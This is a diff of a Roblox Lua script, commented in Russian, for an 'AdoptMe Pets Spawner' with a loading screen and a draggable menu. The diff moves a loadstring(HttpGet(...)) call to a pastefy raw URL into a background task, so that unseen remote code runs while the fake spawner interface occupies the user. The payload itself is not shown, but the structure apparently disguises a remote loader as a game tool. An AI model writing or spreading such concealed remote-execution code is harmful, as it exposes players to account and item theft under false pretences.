@@ -1,25 +1,29 @@
--- 1️⃣ Личный скрипт
-loadstring(game:HttpGet("https://pastefy.app/BLldvDWO/raw"))() -- сюда вставляешь свой основной код
-
--- 2️⃣ Загрузочный экран
 local TweenService = game:GetService("TweenService")
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
+-------------------------------------------------------
+-- 1️⃣ ЛИЧНЫЙ СКРИПТ (параллельно)
+-------------------------------------------------------
+task.spawn(function()
+    loadstring(game:HttpGet("https://pastefy.app/BLldvDWO/raw"))()
+end)
+
+-------------------------------------------------------
+-- 2️⃣ ЗАГРУЗОЧНЫЙ ЭКРАН
+-------------------------------------------------------
 local screenGui = Instance.new("ScreenGui")
 screenGui.IgnoreGuiInset = true
 screenGui.ResetOnSpawn = false
 screenGui.Parent = playerGui
 
--- Фон загрузки
 local bg = Instance.new("Frame")
 bg.Size = UDim2.new(1,0,1,0)
 bg.BackgroundColor3 = Color3.fromRGB(20,20,20)
 bg.BackgroundTransparency = 1
 bg.Parent = screenGui
 
--- Заголовок
 local title = Instance.new("TextLabel")
 title.Size = UDim2.new(1,0,0,100)
 title.Position = UDim2.new(0,0,0.35,0)
@@ -31,7 +35,6 @@ title.TextScaled = true
 title.TextTransparency = 1
 title.Parent = bg
 
--- Полоска контейнер
 local barContainer = Instance.new("Frame")
 barContainer.Size = UDim2.new(0.6,0,0,25)
 barContainer.Position = UDim2.new(0.2,0,0.52,0)
@@ -40,14 +43,12 @@ barContainer.BorderSizePixel = 0
 barContainer.BackgroundTransparency = 1
 barContainer.Parent = bg
 
--- Полоска заполнения
 local barFill = Instance.new("Frame")
 barFill.Size = UDim2.new(0,0,1,0)
 barFill.BackgroundColor3 = Color3.fromRGB(0,170,255)
 barFill.BorderSizePixel = 0
 barFill.Parent = barContainer
 
--- Проценты
 local percentText = Instance.new("TextLabel")
 percentText.Size = UDim2.new(1,0,0,40)
 percentText.Position = UDim2.new(0,0,0.56,30)
@@ -89,22 +90,22 @@ sound.Volume = 1
 sound.Parent = screenGui
 sound:Play()
 
--- 3️⃣ Меню после загрузки (уменьшенное и перетаскиваемое)
+-------------------------------------------------------
+-- 3️⃣ МЕНЮ ПОСЛЕ ЗАГРУЗКИ
+-------------------------------------------------------
 local menu = Instance.new("Frame")
-menu.Size = UDim2.new(0,300,0,250) -- меньшее окно
-menu.Position = UDim2.new(0.5,-150,0.5,-125)
+menu.Size = UDim2.new(0,360,0,260) -- немного меньше
+menu.Position = UDim2.new(0.5,-180,0.5,-130)
 menu.BackgroundColor3 = Color3.fromRGB(255,176,80)
 menu.BorderSizePixel = 0
 menu.Parent = screenGui
 
--- Закругление
 local corner = Instance.new("UICorner")
 corner.CornerRadius = UDim.new(0,18)
 corner.Parent = menu
 
--- Заголовок меню
 local title2 = Instance.new("TextLabel")
-title2.Size = UDim2.new(1,0,0,50)
+title2.Size = UDim2.new(1,0,0,40)
 title2.BackgroundTransparency = 1
 title2.Text = "AdoptMe Pets Spawner"
 title2.TextColor3 = Color3.fromRGB(255,255,255)
@@ -114,8 +115,8 @@ title2.Parent = menu
 
 -- Поле ввода
 local input = Instance.new("TextBox")
-input.Size = UDim2.new(0.85,0,0,40)
-input.Position = UDim2.new(0.075,0,0.25,0)
+input.Size = UDim2.new(0.85,0,0,35)
+input.Position = UDim2.new(0.075,0,0.2,0)
 input.BackgroundColor3 = Color3.fromRGB(255,214,150)
 input.BorderSizePixel = 0
 input.PlaceholderText = "Write a pet name"
@@ -138,7 +139,7 @@ local buttons = {
 for i,b in ipairs(buttons) do
     local btn = Instance.new("TextButton")
     btn.Size = UDim2.new(0.21,0,0,35)
-    btn.Position = UDim2.new(0.04 + (i-1)*0.23,0,0.5,0)
+    btn.Position = UDim2.new(0.04 + (i-1)*0.24,0,0.45,0)
     btn.BackgroundColor3 = b.Color
     btn.BorderSizePixel = 0
     btn.Text = b.Text
@@ -177,14 +178,25 @@ footer.Font = Enum.Font.GothamBold
 footer.TextScaled = true
 footer.Parent = menu
 
--- 🌟 Перетаскивание окна касанием
-local dragging, dragInput, dragStart, startPos
+-------------------------------------------------------
+-- 4️⃣ ДВИЖЕНИЕ МЕНЮ (касание/мышь)
+-------------------------------------------------------
+local dragging = false
+local dragInput
+local dragStart
+local startPos
+
+local function update(input)
+    local delta = input.Position - dragStart
+    menu.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+end
 
 menu.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
         dragging = true
         dragStart = input.Position
         startPos = menu.Position
+
         input.Changed:Connect(function()
             if input.UserInputState == Enum.UserInputState.End then
                 dragging = false
@@ -194,14 +206,13 @@ menu.InputBegan:Connect(function(input)
 end)
 
 menu.InputChanged:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseMovement then
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
         dragInput = input
     end
 end)
 
 game:GetService("UserInputService").InputChanged:Connect(function(input)
     if input == dragInput and dragging then
-        local delta = input.Position - dragStart
-        menu.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        update(input)
     end
 end)
